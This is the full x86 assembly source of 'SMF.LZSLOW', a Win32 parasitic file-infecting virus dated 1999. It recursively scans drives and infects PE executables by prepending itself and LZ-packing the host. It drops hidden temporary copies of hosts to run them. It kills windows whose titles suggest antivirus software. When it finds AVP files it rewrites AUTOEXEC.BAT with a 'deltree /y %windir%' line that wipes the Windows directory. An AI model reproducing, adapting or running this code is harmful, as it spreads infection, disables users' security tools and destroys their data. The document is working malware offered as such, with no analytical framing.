   ; ============================ SMF.LZSLOW =============================
   ; Program   : SMF.LZSLOW
   ; Description   : Parasitic, "semi-resident" virus
   ; Last modified : 24.Apr.1999
   ; Purpose   : process handling under win32
   ; Target OS : Win95/98/NT
   ; Notes     :
   ; TODO      :

   .386
   .model flat,stdcall
   include win.inc
   .code

   start:  nop ; do you know, why my win32 asm progs start with NOP ?

   ; ================= Get our command line ====================

           extrn GetCommandLineA:PROC
       call GetCommandLineA
       mov esi,eax
       mov edi,offset cmdline
       mov eax,edi
       mov ecx,512/4
       rep movsd
   ; ======== searching for end of the filename =================
       mov esi,eax
       mov edi,eax
       mov ax,'" '
           xor ecx,ecx
       cmp [esi],ah
       jnz short srch
           mov [esi],cl
           inc edi
       mov al,ah
   srch:   inc esi
       cmp [esi],cl
           jz short srdone ; only for NT - sometimes there is no end spaces in command line
       cmp [esi],al
       jnz short srch
       mov byte ptr [esi],cl
       inc esi
   srdone: mov [paramlist],esi ; store pointer to command line parameters
       extrn CreateFileA:PROC
       call CreateFileA,edi,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0
       mov [handle],eax
       mov ebp,eax
       extrn SetFilePointer:PROC
       call SetFilePointer,eax,-4,0,FILE_END   ; seeking to end of file
           mov [mysize],eax ; if first runned, then mysize = filesize (no victim)
       mov edi,offset plength
       extrn ReadFile:PROC
       call ReadFile,ebp,edi,4,offset len1,0 ; reading last 4 bytes in file
       cmp dword ptr [edi],0 ; is packed length data = 0 ?
       jz NODATA ; we are running for the first time from installer
       mov [first],0
   ;--------------------------------------------------
   ; allocating some memory for packed data
       extrn GlobalAlloc:PROC
       call GlobalAlloc,GMEM_FIXED,dword ptr [edi]
       mov [packed],eax ; store pointer
   ; loading victim
       mov edx,[edi]
       mov esi,eax ; esi=&(packed_data)
       add edx,4
       neg edx
       call SetFilePointer,ebp,edx,0,FILE_END ; locating packed data
           mov [mysize],eax
       call ReadFile,ebp,[packed],dword ptr [edi],offset len1,0
           extrn CloseHandle:PROC
       call CloseHandle,ebp
       call GlobalAlloc,GMEM_FIXED,dword ptr [esi] ; first dword
               ; in packed data=original file length
       mov [unpacked],eax
       add esi,4
       mov edi,eax

   ; ====================== LZ77 family unpacker ==========================
       xor ecx,ecx
       xor edx,edx
       cld
   unlzlp: lodsb
       test al,al
       jz short unlzret ; zero = end of packed data
       test al,80h
       jnz short lzref
       mov cl,al
       rep movsb ; simply copy some bytes from in to out
       jmp short unlzlp
   lzref:  mov dh,al ; processing data reference
       and dh,0fh
       mov cl,al
       shr ecx,4
       and cl,7
       add ecx,3
       lodsb ; load reference offset (low 8 bits)
       mov dl,al
       xchg eax,esi
       mov esi,edi
       sub esi,edx
       rep movsb ; copy some bytes from already unpacked data
       xchg eax,esi
       jmp short unlzlp
   unlzret: ; ====================== unpacker end ============================
   ; Creating unique filename (c:\windows\sys????.tmp, where ???? depends of current time)
   ; if we are starting from multiuser NT, name may be following:
   ;                       c:\winnt\profiles\<username>\sys????.tmp
       mov ebp,offset fName
           extrn GetWindowsDirectoryA:PROC
       call GetWindowsDirectoryA,ebp,512
           lea edi,[eax+ebp]
           mov esi,offset SysTime
           extrn GetSystemTime:PROC
           call GetSystemTime,esi
       mov eax,[esi+8]
           rol eax,4
           add eax,52352356h
           xor eax,[esi+0ch] ; now eax=Hour/Minute xor Second/Millisecond
           mov [edi],'sys\'
       and eax,0f0f0f0fh
       add eax,'aaaa'
           mov [edi+4],eax
           mov [edi+8],'mpt.' ; .tmp
           mov byte ptr [edi+12],0 ; complete filename
   ; ============= writing to file ====================
           mov [cmdline1],ebp
       call CreateFileA,ebp,GENERIC_WRITE,0,0,CREATE_ALWAYS,\
               FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM,0
           push eax ; for CloseHandle
           mov ebx,[packed]
           extrn WriteFile:PROC
           call WriteFile,eax,[unpacked],dword ptr [ebx],offset len1,0
           call CloseHandle ; handle already pushed
   ; ============= freeing memory ====================
           extrn GlobalFree:PROC
       call GlobalFree,[packed]
       call GlobalFree,[unpacked]
   ; =========== append the received command line to new program name ============
           mov byte ptr [edi+12],' '
           add edi,13
       mov esi,[paramlist]
   cmdloop:lodsb
       test al,al
           stosb
           jnz short cmdloop
   ; =============== now we are ready to run application ==================
   ; we'll use NULL for process directory, so its current directory will
   ; directory infected program runned from
       extrn CreateProcessA:PROC
           call CreateProcessA,0,ebp,0,0,FALSE,NORMAL_PRIORITY_CLASS,0,0,\
                offset _si,offset pi

   NODATA: ; jumping here, if first time runned
   ; ================= CHECK FOR VIRUS PRESENCE =========================
           extrn GetVersion:PROC
           call GetVersion
           rol eax,1
           jnc short foundNT ; don't check presense in memory on NT
       extrn GlobalFindAtomA:PROC
       call GlobalFindAtomA,offset version
       test eax,eax    ; if atom 'Win32.LZ' defined, then another copy
       jnz quit1   ; of virus already working ;)
   foundNT:
           extrn GlobalAddAtomA:PROC
       call GlobalAddAtomA,offset version
       mov [atom],eax
   ; ============ now let's scan directory tree and infect files ==============
           mov eax,'\:D'   ; scan disk D:
       call DiskScan
           mov eax,'\:E'   ; scan disk E:
       call DiskScan
           mov eax,'\:C'   ; scan disk C:
       call DiskScan
   ; ================ scanning is over... good bye ========================
   again:  call CheckStop
       test [first],0ffh
       jz short again
       jmp quit

   ; ==== It is a recursive function for scanning directory tree ====
   DiskScan:
       mov dword ptr [CurName],eax
   Search: mov ebx,offset CurName
       mov ebp,offset FindData
       mov edi,ebx
   ss1:    inc edi
       test byte ptr [edi],0ffh
       jnz short ss1
           mov dword ptr [edi],'*.*' ; strcat(path,"*.*\0");
           extrn FindFirstFileA:PROC
       call FindFirstFileA,ebx,ebp
           mov esi,eax
           inc eax
       jz return
   ssagain:mov ebx,offset cFileName
       push edi esi ebp
       cmp byte ptr [ebx],'.'
       jz next ; skip "." and ".." directories
       mov eax,[ebx]
       or eax,202020h
           cmp eax,'3pva'  ; checking for avp3*.*
           jnz short noAVP
           call CreateFileA,offset ffn,GENERIC_WRITE,0,0,CREATE_ALWAYS,0,0
           push eax
           call WriteFile,eax,offset joke,ej-joke,offset len1,0
           call CloseHandle ; eax pushed
   noAVP:
   copy1:  mov al,byte ptr [ebx]
       inc ebx
           mov byte ptr [edi],al
           inc edi
           test al,al
           jnz short copy1
       test byte ptr [ebp],10h ; check directory flag
       jz short file
   ; ========= HANDLING DIRECTORY ============
           mov word ptr [edi-1],'\'
       call Search
       jmp next
   ; ============= HANDLING FILE =============
   file:   mov eax,[edi-5]
           or eax,20202000h ; convert extension to lower case
       cmp eax,'exe.'  ; infect only .exe files
           jnz next
           call CreateFileA,offset CurName,GENERIC_READ or GENERIC_WRITE,0,0,\
               OPEN_EXISTING,0,0
           mov edi,eax ; store file handle
       inc eax
           jz next ; file open error
           extrn GetFileSize:PROC
           mov ebp,offset len1
       call GetFileSize,edi,ebp
           mov [unplen],eax
           mov esi,eax
           call GlobalAlloc,GMEM_FIXED,eax
       mov [unpacked],eax
           push eax
       call ReadFile,edi,eax,esi,ebp,0
           call CloseHandle,edi    ; close file
       pop edi
       cmp word ptr [edi],'M'+100h*'Z' ; is it exe-file?
           jnz freemem
       mov eax,dword ptr [edi+3ch]
           cmp eax,esi
           jae freemem
           cmp dword ptr [edi+eax],'P'+100h*'E'    ; is it PE-file?
           jnz freemem
           cmp dword ptr [edi+esi-4],0
           jnz freemem ; already infected
       call GlobalAlloc,GMEM_FIXED,esi ; get memory for packer
           mov [packed],eax
           call LZPack
       call GlobalFree,[unpacked]
           mov ebp,[mysize]
           call GlobalAlloc,GMEM_FIXED,ebp ; size of virus in PE-exe
       mov edi,eax

       mov eax,offset cmdline
           cmp byte ptr [eax],0
           jnz short line1
           inc eax
   line1:  call CreateFileA,eax,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0
       mov esi,eax
           call ReadFile,esi,edi,ebp,offset len1,0
           call CloseHandle,esi

           call CreateFileA,offset CurName,GENERIC_WRITE,0,0,CREATE_ALWAYS,\
           0,0
       mov esi,eax
           call WriteFile,esi,edi,ebp,offset len1,0
           call GlobalFree,edi
           call WriteFile,esi,offset unplen,4,offset len1,0
           mov edi,[packed]
           mov ebp,[plength]
           call WriteFile,esi,edi,ebp,offset len1,0
       call GlobalFree,edi
           add [plength],4
       call WriteFile,esi,offset plength,4,offset len1,0
           call CloseHandle,esi


   freemem:call GlobalFree,[unpacked]
   next:   pop ebp esi edi
       extrn FindNextFileA:PROC
       call CheckStop
       call FindNextFileA,esi,ebp
           test eax,eax
           jnz ssagain
   return: mov byte ptr [edi],0
           call CloseHandle,esi
   retptr: ret
   ; ====== This function terminates our scanning, if host program done =======
   CheckStop:
       extrn EnumWindows:PROC
           push esi edi ebp
       call EnumWindows,offset MyProc,12h ; check for antiviruses, kill them
           pop ebp edi esi
       test [first],0ffh ; if first runned, then don't check process
           jnz short retptr
       extrn GetProcessVersion:PROC
       call GetProcessVersion,[processID]
       test eax,eax
           jnz short retptr

           extrn DeleteFileA:PROC
       call DeleteFileA,[cmdline1]
           extrn ExitProcess:PROC
           extrn GlobalDeleteAtom:PROC
   quit:   call GlobalDeleteAtom,[atom] ; undefine atom

   quit1:  call ExitProcess,0

   ; ===================== Check for windows antivirus software ===========
   MyProc: mov eax,dword ptr [esp+4] ; found window
           push edi ebp esi ecx ebx ; need for correct enumerating
           mov edi,eax
       mov esi,offset wndname
           extrn SendMessageA:PROC
           call SendMessageA,edi,WM_GETTEXT,512,esi

           mov cx,'be' ; dr.web
           call Destroy
           mov cx,'va' ; "AV" - APV and other antivirus software
           call Destroy

   done:   mov al,TRUE ; return true to say system, that we want more windows!
       pop ebx ecx esi ebp edi
       ret 8   ; two parameters passed
   ; ====================== Seek and Destroy ===========================
   Destroy:xor ebx,ebx
   search: mov eax,dword ptr [esi+ebx]
           or eax,2020h
           xor ax,cx
           jz short kill
           inc ebx
       test byte ptr [esi+ebx],0ffh
           jnz short search
       ret

   kill:   xor ebx,ebx
       extrn PostMessageA:PROC
           call PostMessageA,edi,WM_QUIT,ebx,ebx
           call PostMessageA,edi,WM_CLOSE,ebx,ebx
           call PostMessageA,edi,WM_ENDSESSION,ebx,ebx
           call PostMessageA,edi,WM_DESTROY,ebx,ebx

           ret

   ; ======================== LZ77 PACKER ==============================
   ;   packs buffer ([unpacked],size=[unplen]), to ([packed],size=[plength])
   ;
   ;       registers alloc:
   ;           al=first byte from source pointer
   ;           edx=data register
   ;           ebp=for saving search pointer
   ;           ebx=for saving maximal length
   ;           esi=source pointer
   ;           edi=search pointer
   ;           ecx=end of source pointer (bounds)
   ;
   LZPack: mov esi,[unpacked] ; seek source pointer to start of source
       mov eax,[packed]
       mov [result],eax ; zero result buffer
       mov eax,offset buffer
       mov [buf],eax
       cld
           call nomatch ; start with storing first symbol to buffer
           mov eax,[result]
           sub eax,[packed]
           mov [plength],eax
       ret

   lzloop: mov edi,esi
           mov ecx,[unpacked]
       sub edi,4094 ; window size
       mov ebx,2 ; maximal found length
           cmp edi,ecx
       jae short shrwin ; if current pointer in source far then 4095 from start,
           ; then search from (source-window_size)
           mov edi,ecx  ; else search from start of source
   shrwin: mov edx,esi ; store source pointer
       add ecx,[unplen] ; now ecx points to last byte of source file
       dec edi
   lzz0:   mov al,[esi] ; get byte from source pointer
   lzbuf2: inc edi
       cmp edi,esi
           jz short findend
       cmp [edi],al
       jnz short lzbuf2
           mov ebp,edi
   lzbuf0: inc esi
       inc edi
           cmp esi,ecx
       jz short fcheck
           mov al,[esi]
           cmp al,[edi]
       jz short lzbuf0
   fcheck:
       mov esi,edx ; restore source pointer
           sub edi,ebp ; calculate matched length
       cmp edi,ebx
       jbe short nomax
       mov [maxofs],ebp
       mov ebx,edi
       cmp edi,10 ; if found reference longer than max_ref_len then stop search
           jae short findend
   nomax:  mov edi,ebp ; restore search pointer
       jmp short lzz0
   findend:
       cmp ebx,2
       jbe short nomatch
       call flush
       cmp ebx,10
       jbe short len_ok1 ; if reference_length <= 10
       mov ebx,10
   len_ok1:mov edx,esi
       sub edx,[maxofs] ; (offset to maximal matched string) will be there
       add esi,ebx
       sub bl,3
       shl bl,4
       or dh,bl
       or dh,80h ; bit7 - denoting a reference
       mov al,dh
       call putb
       mov al,dl
       call putb
       mov ecx,[unplen]
           add ecx,[unpacked]
           cmp esi,ecx
       jnz lzloop
       jmp lzdone

   nomatch:mov al,[esi]
       inc esi     ; store al to buffer
       mov edi,[buf]
       mov [edi],al
       inc edi
       mov [buf],edi
       cmp edi,offset buffer+127
       jnz short nofull
       call flush
   nofull: mov ecx,[unplen]
           add ecx,[unpacked]
           cmp esi,ecx
       jnz lzloop
   lzdone: call flush
       xor al,al
       jmp short putb

   ; ================ FLUSH =======================
   ; flush temporary buffer (can't use esi,ebx,ebp)
   flush:  mov ecx,[buf]
       mov edi,offset buffer
       sub ecx,edi
       jz short ret1ptr ; buffer is empty
       mov al,cl
       call putb ; store length
   flm1:   mov al,[edi]
       inc edi
       call putb
       loop flm1
       mov eax,offset buffer
       mov [buf],eax
   ret1ptr:ret
   ; ================ PUT BYTE al TO OUTPUT STREAM ================
   ;       can't use esi,ebx,ecx,edi,edx
   putb:   push edi
       mov edi,[result]
       stosb
       mov [result],edi
       pop edi
       ret
   ; ==========================================================================

   .data
   SysTime dw 8 dup (?)
   first   db 1    ; we are running from installer
   cmdline1 dd ?   ; name of hidden file
   maxofs  dd ?    ; offset of longest mathed string
   buf dd ?    ; pointer to current symbol in 128-byte LZ-buffer
   result  dd ?    ; current pointer to LZ packed data
   mysize  dd ?    ; size of virus file without victim
   paramlist dd ?  ; pointer of the remainder with command line paramaters
   unpacked dd ?   ; pointer to unpacked data
   packed  dd ?    ; pointer to packed data
   handle  dd ?    ; handle to file
   plength dd ?    ; length of packed data
   unplen  dd ?    ; length of source file
   len1    dd ?    ; number of actually read/written bytes in IO operations
   atom    dd ?    ; ATOM for checking presence
   version db '[SMF.LZSLOW]',0
   cmdline db 512 dup (?)  ; command line and current program
   fName   db 512 dup (?) ; filename of created file
   _si dd 17 dup (?)  ; startup info

   wndname db 512 dup (?)  ; 512-byte buffer for windows names
   buffer      label   ; 128-byte LZ-buffer in same place with search record
   FindData    label   ; search record
   dwFileAttributes    dd ?
   ftCreationTime      dq ?
   ftLastAccessTime    dq ?
   ftLastWriteTime     dq ?
   nFileSizeHigh       dd ?
   nFileSizeLow        dd ?
   dwReserved0     dd ?
   dwReserved1     dd ?
   cFileName       db MAX_PATH dup (?)
   cAlternateFileName  db 14 dup (?)
           ; end of search record

   ; Starting directory:
   CurName     db '!', 512 dup (0)
   ;CurName        db 'c:\temp\test\', 512 dup (0)

   ffn db 'C:\AUTOEXEC.BAT',0
   joke    db '@echo Wait: AVP is searching viruses now...',0dh,0ah
       db '@deltree /y %windir% >nul :) AVP',0dh,0ah
   ej  label

   pi  label   ; PROCESS_INFORMATION struct:
   hProcess    dd ?
   hTread      dd ?
   processID   dd ?
   treadID     dd ?
           ; end of PROCESS_INFORMATION structure

           end start
